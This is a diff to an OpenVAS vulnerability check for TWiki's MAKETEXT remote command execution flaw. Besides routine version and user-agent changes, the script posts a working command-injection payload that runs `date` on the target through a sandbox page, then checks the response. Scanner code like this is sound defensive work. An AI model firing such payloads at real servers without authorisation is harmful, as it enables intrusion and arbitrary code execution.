@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_twiki_maketext_rce_vuln.nasl 11357 2018-09-12 10:57:05Z asteins $
+# $Id: gb_twiki_maketext_rce_vuln.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # TWiki 'MAKETEXT' variable Remote Command Execution Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:twiki:twiki";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802048");
-  script_version("$Revision: 11357 $");
+  script_version("$Revision: 11435 $");
   script_bugtraq_id(56950);
   script_cve_id("CVE-2012-6329", "CVE-2012-6330");
   script_tag(name:"cvss_base", value:"7.5");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-12 12:57:05 +0200 (Wed, 12 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-12-27 12:46:41 +0530 (Thu, 27 Dec 2012)");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_name("TWiki 'MAKETEXT' variable Remote Command Execution Vulnerability");
@@ -66,7 +66,6 @@ if(description)
   exit(0);
 }
 
-
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
@@ -76,6 +75,7 @@ if( ! dir = get_app_location( cpe:CPE, port:twikiPort ) ) exit( 0 );
 
 if( dir == "/" ) dir = "";
 
+useragent = get_http_user_agent();
 host = http_host_name(port:twikiPort);
 
 sandbox_page = "/Sandbox/OVTestPage123";
@@ -83,7 +83,7 @@ sandbox_page = "/Sandbox/OVTestPage123";
 url1 = dir + "/edit" + sandbox_page + "?nowysiwyg=1";
 req1 = string("GET ", url1 , " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
-             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+             "User-Agent: ", useragent, "\r\n",
              "Cookie: TWIKISID=\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: 0\r\n\r\n");
@@ -102,7 +102,6 @@ if(!crypt_token[1]){
 
 crypt_token = crypt_token[1];
 
-## Extract cookie
 cookie = eregmatch(pattern:"Set-Cookie: TWIKISID=([0-9a-f]*);", string:res1);
 if(cookie[1]){
   cookie = cookie[1];
@@ -112,12 +111,12 @@ if(cookie[1]){
 
 ## Insert RCE and save the page
 url2 = dir + "/save" + sandbox_page;
-post_data = string("crypttoken=", crypt_token , "&text=OpenVASTest%20%25",
+post_data = string("crypttoken=", crypt_token , "&text=VT-Test%20%25",
             "MAKETEXT%7B%22APt%20%5B_1%5D%20rxCsi%5C%5C'%7D%3B%20%60date",
             "%60%3B%20%7B%20%23%22%20args%3D%22QpR%22%7D%25");
 req2 = string("POST ", url2 , " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
-             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+             "User-Agent: ", useragent, "\r\n",
              "Cookie: TWIKISID=", cookie, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", (strlen(post_data)), "\r\n\r\n",
@@ -128,7 +127,7 @@ res2 = http_keepalive_send_recv(port:twikiPort, data:req2);
 url3 = dir + "/view" + sandbox_page;
 req3 = string("GET ", url3 , " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
-             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+             "User-Agent: ", useragent, "\r\n",
              "Cookie: TWIKISID=\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: 0\r\n\r\n");
@@ -139,7 +138,7 @@ url4 = dir + "/save" + sandbox_page;
 post_data = string("crypttoken=", crypt_token , "&text=OV-Test");
 req4 = string("POST ", url4 , " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
-             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+             "User-Agent: ", useragent, "\r\n",
              "Cookie: TWIKISID=", cookie, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", (strlen(post_data)), "\r\n\r\n",
@@ -147,7 +146,7 @@ req4 = string("POST ", url4 , " HTTP/1.1\r\n",
 res4 = http_keepalive_send_recv(port:twikiPort, data:req4);
 
 if(res1 =~ "HTTP/1.. 200 OK" && "}; `date`; {" >!< res3 &&
-   egrep(string:res3, pattern:">OpenVASTest</a></span> HASH\(0x")){
+   egrep(string:res3, pattern:">VT-Test</a></span> HASH\(0x")){
   report = report_vuln_url( port:twikiPort, url:url1 );
   security_message(port:twikiPort, data:report);
   exit(0);
